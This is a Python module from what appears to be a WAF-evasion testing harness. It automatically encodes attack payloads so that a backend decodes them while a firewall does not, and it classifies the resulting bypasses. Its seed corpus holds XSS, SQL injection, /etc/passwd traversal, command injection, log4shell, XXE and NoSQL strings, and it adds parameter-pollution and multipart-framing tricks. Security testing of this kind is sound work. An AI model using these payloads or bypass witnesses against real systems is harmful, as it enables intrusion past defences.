"""The divergence engine.

Given two stacks, find inputs where they disagree about *what the request says*.
The search is constructed, not exhaustive: the pipeline difference tells the
engine which encoders to apply and in what order, so it never enumerates
payloads blindly.

The reasoning, in one line:

    for every decode step the backend has and the WAF does not,
    encode the payload with that step's inverse

If the WAF never decodes ``%253C`` and the backend does, the token survives only
on the backend side. That is the whole method, applied mechanically across any
pair of stacks — which is why the project is not tied to one message format, one
language or one vendor.

Depth is bounded by :class:`Budget`. Unbounded derivation is a denial-of-service
against your own laptop, and in practice the useful witnesses are one or two
encodings deep.
"""

from __future__ import annotations

import itertools
from dataclasses import dataclass, field, replace
from typing import Dict, Iterable, List, Optional, Sequence, Tuple

from wafharness import encoders
from wafharness.framing import rfc2047_encode
from wafharness.models import (
    Divergence,
    DivergenceKind,
    Stack,
    differing,
)

# ══════════════════════════════════════════════════════════════════════════════
#  Corpus
# ══════════════════════════════════════════════════════════════════════════════

#: Canonical payloads, one per delivery context. These are *seeds*, not a payload
#: list: the engine encodes them itself, so what ships here is a handful of
#: realistic shapes rather than a catalogue.
CORPUS: Dict[str, bytes] = {
    "html": b'<script>alert(1)</script>',
    "html-attr": b'<img src=x onerror=alert(1)>',
    "sql": b"' OR 1=1-- -",
    "sql-union": b"UNION SELECT password FROM users",
    "path": b"../../../../etc/passwd",
    "path-filter": b"php://filter/convert.base64-encode/resource=index",
    "template": b"{{7*7}}${7*7}",
    "command": b";id|whoami`id`",
    "header-inject": b"value\r\nX-Injected: 1",
    "log4shell": b"${jndi:ldap://127.0.0.1/a}",
    "xml": b"<!DOCTYPE x [<!ENTITY e SYSTEM 'file:///etc/passwd'>]>",
    "nosql": b'{"$ne": null}',
}

#: The tokens an inspector looks for. A stack "sees" a token when it survives its
#: pipeline; a WAF that sees it blocks, a backend that sees it executes.
TOKENS: Tuple[str, ...] = (
    "<script", "onerror", "../../", "etc/passwd", "UNION SELECT", "OR 1=1",
    "{{", "${", ";id", "`id`", "jndi:", "<!ENTITY", "$ne",
)

#: A request small enough to be plausible and large enough to hold a payload.
#: Every witness is embedded in one of these so it can be sent verbatim.
ENVELOPES: Dict[str, bytes] = {
    "query": b"q=%s",
    "body": b"comment=%s",
    "path": b"/api/v1/%s",
    "json": b'{"field":"%s"}',
}


@dataclass
class Budget:
    """How far the search may go.

    Defaults are deliberately small. A witness two encodings deep that survives a
    real WAF is worth more than ten thousand brute-forced permutations, and calm
    defaults keep a scan polite.
    """

    #: Maximum number of encoders chained in one witness.
    max_depth: int = 2
    #: Maximum witnesses evaluated per (stack pair, payload).
    max_variants: int = 40
    #: Stop after this many divergences for one pair.
    max_divergences: int = 25
    #: Also try composing two *different* encoders (e.g. percent + fullwidth).
    allow_mixed_chains: bool = True


# ══════════════════════════════════════════════════════════════════════════════
#  Construction
# ══════════════════════════════════════════════════════════════════════════════


def encode_chain(payload: bytes, decode_names: Sequence[str]) -> bytes:
    """Encode ``payload`` so the given decoders reproduce it.

    The decode pipeline runs first-to-last, so its inverse runs last-to-first.
    Getting this backwards produces a witness that decodes into noise at both
    ends and is silently discarded — an easy bug, so it is asserted in the tests.
    """
    result = payload
    for name in reversed(list(decode_names)):
        result = encoders.for_transform(name)(result)
    return result


def _witness_chains(waf: Stack, backend: Stack,
                    budget: Budget) -> List[Tuple[str, ...]]:
    """Encoding chains worth trying for this pair.

    Only steps the backend performs and the WAF does not can create a bypass:
    a step both perform is neutralised by symmetry, and a step only the WAF
    performs makes it *stricter*, which is not a bypass at all.
    """
    waf_names = {t.name for t in waf.decode} | {t.name for t in waf.normalize}
    backend_steps = [t.name for t in backend.decode + backend.normalize]
    only_backend = [name for name in backend_steps if name not in waf_names]

    chains: List[Tuple[str, ...]] = []
    for depth in range(1, min(budget.max_depth, len(only_backend)) + 1):
        for combination in itertools.combinations(only_backend, depth):
            for permutation in itertools.permutations(combination):
                if permutation not in chains:
                    chains.append(permutation)

    if budget.allow_mixed_chains:
        # A single step repeated is its own class (double encoding), and so is a
        # pair of different steps; the permutations above only cover the latter.
        for name in only_backend:
            if encoders.has_encoder(name):
                doubled = (name, name)
                if doubled not in chains:
                    chains.append(doubled)

    return chains[: budget.max_variants]


def _sees(view: bytes, tokens: Iterable[str]) -> Tuple[str, ...]:
    """Which tokens survived into this stack's view.

    Matching is case-insensitive because WAF rules are: a stack that lowercases
    before matching has case-insensitive rules, so a view containing ``<!entity``
    does trip a rule written for ``<!ENTITY``. Matching case-sensitively here
    invented bypasses that cannot exist — the tool reported a tag as "hidden from
    the WAF" when the WAF had plainly seen it.
    """
    lowered = view.lower()
    found = []
    for token in tokens:
        try:
            if token.encode().lower() in lowered:
                found.append(token)
        except UnicodeEncodeError:  # pragma: no cover - tokens are ASCII
            continue
    return tuple(found)


def classify(waf: Stack, backend: Stack, witness: bytes,
             tokens: Iterable[str] = TOKENS) -> Divergence:
    """Run one witness through both stacks and decide what happened.

    The four outcomes are mutually exclusive and exhaustive:

    * **HIDDEN_FROM_WAF** — the backend reaches a token and the WAF does not
      block. This is the bypass.
    * **REWRITTEN** — neither side blocks, neither side reaches a token, but the
      views differ. Not executable; useful for request smuggling where the point
      is that two hops disagree.
    * **DEAD_END** — the WAF blocks and the backend never reaches a token. The
      request dies for nothing.
    * **NO_GAP** — the WAF blocks and the backend would have reached the token
      anyway, or both sides see the same thing. Blocked is blocked.
    """
    tokens = tuple(tokens)

    waf_view, waf_rejection = waf.run(witness)
    backend_view, backend_rejection = backend.run(witness)

    waf_tokens = _sees(waf_view, tokens)
    backend_tokens = _sees(backend_view, tokens)

    waf_blocks = bool(waf_rejection) or bool(waf_tokens)
    backend_reaches = not backend_rejection and bool(backend_tokens)

    if backend_reaches and not waf_blocks:
        kind = DivergenceKind.HIDDEN_FROM_WAF
    elif not waf_blocks and not backend_reaches and waf_view != backend_view:
        kind = DivergenceKind.REWRITTEN
    elif waf_blocks and not backend_reaches:
        kind = DivergenceKind.DEAD_END
    else:
        kind = DivergenceKind.NO_GAP

    return Divergence(
        left=waf.name,
        right=backend.name,
        witness=witness,
        kind=kind,
        left_view=waf_view,
        right_view=backend_view,
        left_rejection=waf_rejection,
        right_rejection=backend_rejection,
        tokens=backend_tokens if kind is DivergenceKind.HIDDEN_FROM_WAF else (),
        differing_steps=differing(waf, backend),
    )


# ══════════════════════════════════════════════════════════════════════════════
#  Search
# ══════════════════════════════════════════════════════════════════════════════


def search_pair(waf: Stack, backend: Stack,
                budget: Optional[Budget] = None,
                corpus: Optional[Dict[str, bytes]] = None,
                tokens: Iterable[str] = TOKENS) -> List[Divergence]:
    """Find every interesting divergence between two stacks."""
    budget = budget or Budget()
    corpus = corpus or CORPUS
    chains = _witness_chains(waf, backend, budget)

    found: List[Divergence] = []
    seen: set = set()

    for payload_name, payload in corpus.items():
        for chain in chains:
            witness = encode_chain(payload, chain)
            if witness in seen or len(witness) > 2048:
                continue
            seen.add(witness)

            result = classify(waf, backend, witness, tokens)
            if result.kind in (DivergenceKind.HIDDEN_FROM_WAF,
                               DivergenceKind.REWRITTEN):
                # Report the encoders that *built* this witness, not the whole
                # symmetric difference of the pipelines: the latter is noise and
                # would credit the bypass to steps that had no part in it.
                found.append(replace(result, differing_steps=chain))
                if len(found) >= budget.max_divergences:
                    return _rank(found)

    return _rank(found)


def search(pairs: Iterable[Tuple[Stack, Stack]],
           budget: Optional[Budget] = None,
           corpus: Optional[Dict[str, bytes]] = None,
           tokens: Iterable[str] = TOKENS) -> List[Divergence]:
    """Search many stack pairs and return one ranked list."""
    budget = budget or Budget()
    results: List[Divergence] = []
    for waf, backend in pairs:
        results.extend(search_pair(waf, backend, budget, corpus, tokens))
    return _rank(results)


def _rank(divergences: List[Divergence]) -> List[Divergence]:
    """Strongest first, then shortest witness (a short bypass is a plausible one)."""
    return sorted(divergences,
                  key=lambda d: (-d.severity, len(d.witness), d.right))


# ══════════════════════════════════════════════════════════════════════════════
#  Framing divergences
# ══════════════════════════════════════════════════════════════════════════════

#: A field name that every frame can find, so the comparison is about the *value*
#: and not about which name was used.
PROBE_KEY = b"input"
PROBE_KEY_TEXT = b"comment"


def _witness_first_vs_last(payload: bytes, key: bytes) -> bytes:
    """Two copies of the key: a benign value first, the payload second.

    A first-wins frame reports the benign value and blocks nothing; a last-wins
    frame executes the payload. HTTP parameter pollution in its simplest form.
    """
    return b"%s=benign&%s=%s" % (key, key, payload)


def _witness_semicolon(payload: bytes, key: bytes) -> bytes:
    """One field whose value contains a ``;``-separated second assignment."""
    return b"%s=benign;%s=%s" % (key, key, payload)


def _witness_json_duplicate(payload: bytes, key: bytes) -> bytes:
    return b'{"%s":"benign","%s":"%s"}' % (key, key, payload)


def _witness_rfc2047(payload: bytes, key: bytes) -> bytes:
    """A multipart part whose ``name`` parameter hides a token behind RFC 2047.

    A frame that decodes encoded-words sees the real field name and can match a
    rule for it; one that does not sees base64 noise. The *name* is what carries
    the divergence here, which is why this witness returns the encoded blob as
    the comparison key.
    """
    encoded = rfc2047_encode(key)
    witness = (b"--__B__\r\n"
               b"Content-Disposition: form-data; "
               b'name="' + encoded + b'"\r\n'
               b"\r\n"
               + payload +
               b"\r\n--__B__--\r\n")
    return witness


def _witness_rfc2047_key(payload: bytes, key: bytes) -> bytes:
    """The plaintext the encoded name should decode to."""
    return key


def _witness_bare_lf(payload: bytes, key: bytes) -> bytes:
    """A multipart part separated by ``\\n\\n`` instead of ``\\r\\n\\r\\n``."""
    return (b"--__B__\n"
            b"Content-Disposition: form-data; name=\"%s\"\n"
            b"\n"
            b"%s"
            b"\n--__B__--\n") % (key, payload)


def _witness_header_duplicate(payload: bytes, key: bytes) -> bytes:
    """Two copies of a header: the first benign, the second the payload."""
    return b"Comment: benign\r\nComment: %s\r\n" % payload


def _witness_header_bare_lf(payload: bytes, key: bytes) -> bytes:
    """A header block whose lines end in bare ``\\n``, not ``\\r\\n``."""
    return b"Comment: benign\nComment: %s\n" % payload


def _witness_cookie_duplicate(payload: bytes, key: bytes) -> bytes:
    """One ``Cookie`` header carrying the same cookie name twice."""
    return b"Cookie: Comment=benign; Comment=%s\r\n" % payload


def framing_search(pair: Tuple[str, str],
                   payloads: Optional[Dict[str, bytes]] = None,
                   tokens: Iterable[str] = TOKENS) -> List[Divergence]:
    """Find witnesses where two frames disagree about a field's value.

    The comparison is deliberately narrow: one field, two frames, one difference
    in the rules. A witness that differs for three reasons cannot be attributed,
    and an unattributable finding is not worth reporting.
    """
    from wafharness.framing import get as get_frame

    left_name, right_name = pair
    left = get_frame(left_name)
    right = get_frame(right_name)
    payloads = payloads or CORPUS
    tokens = tuple(tokens)

    found: List[Divergence] = []

    for _name, payload in payloads.items():
        for builder in _builders_for((left_name, right_name), PROBE_KEY_TEXT):
            witness, key = builder(payload)
            left_value = left.value(witness, key)
            right_value = right.value(witness, key)

            # A frame that cannot find the key at all *is* the divergence for the
            # multipart-strict case: it rejects the delimiter and produces no
            # field, while the lenient frame produces one carrying the token.
            if left_value == right_value:
                continue

            left_tokens = _sees(left_value or b"", tokens)
            right_tokens = _sees(right_value or b"", tokens)

            # The interesting direction: one side's view is inert, the other's
            # carries a token. That is the frame pair doing the work.
            if bool(left_tokens) == bool(right_tokens):
                continue

            reaches_left = bool(left_tokens)
            found.append(Divergence(
                left=left_name,
                right=right_name,
                witness=witness,
                kind=DivergenceKind.HIDDEN_FROM_WAF if not reaches_left
                else DivergenceKind.REWRITTEN,
                left_view=left_value or b"<absent>",
                right_view=right_value or b"<absent>",
                tokens=right_tokens if not reaches_left else left_tokens,
                differing_steps=(f"{left_name} != {right_name}",),
            ))

    return _rank(found)


def _builders_for(pair: Tuple[str, str], key: bytes = PROBE_KEY_TEXT):
    """Witness builders that make sense for a given frame pair.

    Returning builders rather than payloads keeps the *construction* next to the
    rule it exploits; a future frame pair only needs an entry here.
    """
    left, right = pair

    if "cookie" in left or "cookie" in right:
        return [lambda payload: (_witness_cookie_duplicate(payload, PROBE_KEY_TEXT),
                                 PROBE_KEY_TEXT)]
    if "header" in left or "header" in right:
        if "strict" in left or "strict" in right:
            return [lambda payload: (
                _witness_header_bare_lf(payload, PROBE_KEY_TEXT),
                PROBE_KEY_TEXT)]
        return [lambda payload: (
            _witness_header_duplicate(payload, PROBE_KEY_TEXT),
            PROBE_KEY_TEXT)]
    if "json" in left or "json" in right:
        return [lambda payload: (_witness_json_duplicate(payload, PROBE_KEY_TEXT),
                                 PROBE_KEY_TEXT)]
    if "rfc2047" in left or "rfc2047" in right:
        # The encoded field *name* is the token carrier here, so the search must
        # look up a name derived from the probe key rather than the payload.
        return [lambda payload: (_witness_rfc2047(payload, key),
                                 rfc2047_encode(key))]
    if "strict" in left or "strict" in right:
        if "multipart" in left or "multipart" in right:
            return [lambda payload: (_witness_bare_lf(payload, PROBE_KEY_TEXT),
                                     PROBE_KEY_TEXT)]
    if "semicolon" in left or "semicolon" in right:
        return [lambda payload: (_witness_semicolon(payload, PROBE_KEY_TEXT),
                                 PROBE_KEY_TEXT)]

    return [lambda payload: (_witness_first_vs_last(payload, PROBE_KEY_TEXT),
                             PROBE_KEY_TEXT)]


def framing_pairs() -> List[Tuple[str, str]]:
    """The frame pairs worth comparing, as declared by the framing module."""
    from wafharness.framing import DISAGREEING_PAIRS
    return list(DISAGREEING_PAIRS)


def explain(divergence: Divergence) -> str:
    """Human-readable breakdown, used by ``--explain`` and the report."""
    lines = [
        f"{divergence.left}  vs  {divergence.right}   [{divergence.kind.value}]",
        f"  witness : {divergence.witness.decode('latin-1')[:110]}",
        f"  waf sees: {divergence.left_view.decode('latin-1')[:110]}",
        f"  backend : {divergence.right_view.decode('latin-1')[:110]}",
    ]
    if divergence.differing_steps:
        lines.append(f"  cause   : {', '.join(divergence.differing_steps)}")
    if divergence.tokens:
        lines.append(f"  reached : {', '.join(divergence.tokens)}")
    return "\n".join(lines)


